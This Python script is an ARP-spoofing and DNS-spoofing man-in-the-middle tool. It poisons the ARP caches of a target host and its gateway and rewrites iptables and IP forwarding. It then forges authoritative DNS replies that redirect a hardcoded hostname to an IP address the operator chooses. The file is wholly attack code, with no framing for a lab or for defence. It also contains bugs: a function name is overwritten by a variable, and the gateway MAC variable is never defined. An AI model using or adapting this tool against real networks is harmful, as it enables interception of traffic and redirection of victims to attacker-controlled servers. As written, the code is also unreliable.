import time
from scapy.all import *
from typing import List
import os
import sys
import threading
import argparse
from netfilterqueue import NetfilterQueue

def get_attacker_mac(interface):
	try:
		return get_if_hwaddr(interface)
	except:
		return None

def get_mac_from_ip(ip_address: str):
	ans = srp1(
		Ether(dst="ff:ff:ff:ff:ff:ff")
		/ARP(pdst=ip_address, hwdst="ff:ff:ff:ff:ff:ff"),
		timeout =2,
		verbose=0,
		)
	if ans:
		return ans.hwsrc
	else:
		return None

def resolve_ip(name: str, ip_address: str):
	print(f"Resolving MAC Adress for {name} {ip_address}")

	mac = get_mac_from_ip(ip_address)

	if mac == None:
		print(f"Unable to resolve IP address. Exiiting!")
		sys.exit(0)

	print(f"Resolved to {mac}")
	return mac


def arp_spoof(interface: str, target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str):
    # Build the packets
    target_packet = Ether(dst=target_mac) / ARP(
    	op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)

    router_packet = Ether(dst=gateway_mac) / ARP(
    	op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip)

    while True:
    	sendp([target_packet, router_packet], verbose=0, iface=interface)
    	# sleeping for 1 sec in between beacons
    	time.sleep(1)

def dns_spoof(
	interface: str,
	hostnames: List[str],
	redirect_ip: str,
	attacker_mac: str,
	target_ip: str,
	target_mac: str,
):
	def dns_spoof(packet):
		data = packet.get_payload()
		scapy_packet = IP(data)
		if not scapy_packet.haslayer(DNSQR):
			packet.accept()
			return
		qname = scapy_packet.qd.qname.decode()
		if qname not in hostnames:
			packet.accept()
			return

		print(f"Got query for {qname}")

		response_packet = (
			IP(src=scapy_packet[IP].dst, dst=scapy_packet[IP].src)
            / UDP(sport=scapy_packet[UDP].dport, dport=scapy_packet[UDP].sport)
            / DNS(
                qr=1,  # Response
                aa=1,  # Authoritative response
                id=scapy_packet[DNS].id,  # Copying the DNS id from the query
                qd=scapy_packet[DNS].qd,  # Copying the DNS query data
                an=DNSRR(
                    ttl=10,  # Time To Live of the packet
                    rdata=redirect_ip,  # What IP to direct to
                    rrname=qname,	# The original hostname of the query
            	),
            )
		)
		packet.set_payload(bytes(response_packet))
		packet.accept()
	nfqueue = NetfilterQueue()
	nfqueue.bind(1, dns_spoof)

	try:
		nfqueue.run()
	except KeyboardInterrupt:
		pass
	finally:
		print("cleaning up")
		nfqueue.unbind()


def main(target_ip: str, gateway_ip: str, interface: str, dns_ip: str):
	target_mac = resolve_ip("Target", target_ip)
	get_attacker_mac = resolve_ip("Gateway", gateway_ip)
	attacker_mac = get_attacker_mac(interface)

	os.system("sysctl -w net.ipv4.ip_forward=1")
	os.system(
		f"iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1 -i {interface}"
	)
	os.system(f"iptables -A FORWARD -o {interface} -j ACCEPT")
	os.system(
		f"iptables -A FORWARD -m state --state ESTABLISHED,RELATED -i {interface} -j ACCEPT"
	)

	try:
		arp_spoof_thread = threading.Thread(
			target = arp_spoof,
			args=(interface, target_ip, target_mac, gateway_ip, gateway_mac),
			daemon=True,
		)
		dns_spoof_thread = threading.Thread(
			target=dns_spoof,
			args=(
				interface,
				["padraig.io"],
				dns_ip,
				attacker_mac,
				target_ip,
				target_mac,
			),
			daemon=True,
		)
		arp_spoof_thread.start()
		dns_spoof_thread.start()
		arp_spoof_thread.join()
		dns_spoof_thread.join()

	except KeyboardInterrupt:
		os.system("sysctl -w net.ipv4.ip_forward=0")
		os.system("iptables -F")
		os.system("iptables -X")
		os.system("iptables -t nat -F")
		os.system("iptables -t nat -X")

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target", help="Target IP")
	parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
	parser.add_argument("-i","--interface",dest="interface",help="Name of network interface",default="eth0",)
	parser.add_argument("-d", "--dns-redirect", dest="dns_ip", help="DNS Redirect IP")
	args = parser.parse_args()

	main(args.target, args.gateway, args.interface, args.dns_ip)